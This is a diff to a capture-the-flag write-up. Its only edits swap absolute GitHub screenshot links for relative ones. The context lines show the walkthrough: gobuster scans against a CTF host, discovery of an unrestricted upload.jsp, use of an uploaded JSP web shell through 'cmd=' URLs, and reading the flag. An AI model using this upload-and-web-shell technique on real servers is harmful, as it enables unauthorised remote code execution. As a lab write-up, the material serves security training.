@@ -37,7 +37,7 @@ Start by performing directory brute-force scanning using `gobuster`:
 gobuster dir -u http://ai.ctf.defhawk.com:8080 -w /usr/share/dirb/wordlists/common.txt
 ```
 
-![Gobuster Initial](https://github.com/ak-115/Getbackshell/blob/main/Screenshot%20From%202025-07-13%2013-41-26.png?raw=true)
+![Gobuster Initial](Screenshot%20From%202025-07-13%2013-41-26.png)
 
 - Found endpoint: `/app`
 
@@ -47,7 +47,7 @@ Exploring `http://ai.ctf.defhawk.com:8080/app` didn't reveal much, so we enumera
 gobuster dir -u http://ai.ctf.defhawk.com:8080/app -w /usr/share/dirb/wordlists/common.txt
 ```
 
-![Gobuster App](https://github.com/ak-115/Getbackshell/blob/main/Screenshot%20From%202025-07-13%2013-48-52.png?raw=true)
+![Gobuster App](Screenshot%20From%202025-07-13%2013-48-52.png)
 
 - Discovered: `/app/images`, `/app/uploads`
 - Still no visible upload functionality.
@@ -60,7 +60,7 @@ After further fuzzing, located the endpoint:
 /app/upload.jsp
 ```
 
-![Upload JSP](https://github.com/ak-115/Getbackshell/blob/main/Screenshot%20From%202025-07-13%2013-56-47.png?raw=true)
+![Upload JSP](Screenshot%20From%202025-07-13%2013-56-47.png)
 
 ---
 
@@ -89,7 +89,7 @@ Test by uploading a simple JSP-based web shell like:
 
 Upload the file. The server does not restrict file type or validate content:
 
-![Upload Success](https://github.com/ak-115/Getbackshell/blob/main/Screenshot%20From%202025-07-13%2014-03-31.png?raw=true)
+![Upload Success](Screenshot%20From%202025-07-13%2014-03-31.png)
 
 Access the shell through:
 
@@ -97,7 +97,7 @@ Access the shell through:
 http://ai.ctf.defhawk.com:8080/app/uploads/shell.jsp?cmd=pwd
 ```
 
-![Shell pwd](https://github.com/ak-115/Getbackshell/blob/main/Screenshot%20From%202025-07-13%2014-06-30.png?raw=true)
+![Shell pwd](Screenshot%20From%202025-07-13%2014-06-30.png)
 
 You now have remote code execution on the server.
 
@@ -113,7 +113,7 @@ Run commands via the web shell to navigate and read the flag:
 http://ai.ctf.defhawk.com:8080/app/uploads/shell.jsp?cmd=ls
 ```
 
-![List](https://github.com/ak-115/Getbackshell/blob/main/Screenshot%20From%202025-07-13%2014-13-07.png?raw=true)
+![List](Screenshot%20From%202025-07-13%2014-13-07.png)
 
 ### Read the flag:
 
@@ -121,7 +121,7 @@ http://ai.ctf.defhawk.com:8080/app/uploads/shell.jsp?cmd=ls
 http://ai.ctf.defhawk.com:8080/app/uploads/shell.jsp?cmd=cat flag.txt
 ```
 
-![Flag](https://github.com/ak-115/Getbackshell/blob/main/Screenshot%20From%202025-07-13%2014-14-06.png?raw=true)
+![Flag](Screenshot%20From%202025-07-13%2014-14-06.png)
 
 Flag retrieved successfully.
 
